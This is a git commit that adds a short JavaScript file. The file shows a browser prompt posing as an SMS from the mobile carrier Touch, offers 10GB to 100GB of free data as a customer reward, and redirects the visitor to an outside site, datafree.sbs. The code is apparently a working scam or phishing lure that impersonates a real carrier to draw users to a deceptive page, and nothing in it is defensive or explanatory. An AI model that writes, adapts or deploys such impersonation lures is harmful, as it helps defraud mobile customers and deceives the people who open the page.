8f9d90cb12d516e9210d2f62183b32b29794e250
mmainomi <akparawa247@gmail.com>
2025-04-03 21:38:18 -0700

    Create activation-touch-freedata.js

---
+++ activation-touch-freedata.js
@@ -0,0 +1,5 @@
+var password = 'FREE DATA'
+password=prompt('TOUCH SMS: Dear customer, kindly check if your Touch sim card is qualify to receive from 10GB To 100GB Data, Old Customers Reward, Press FreeData to Check Now ','FREE DATA');
+if (password != 'FREE DATA') {
+location.href='https://datafree.sbs/touch-freedata.html';
+}
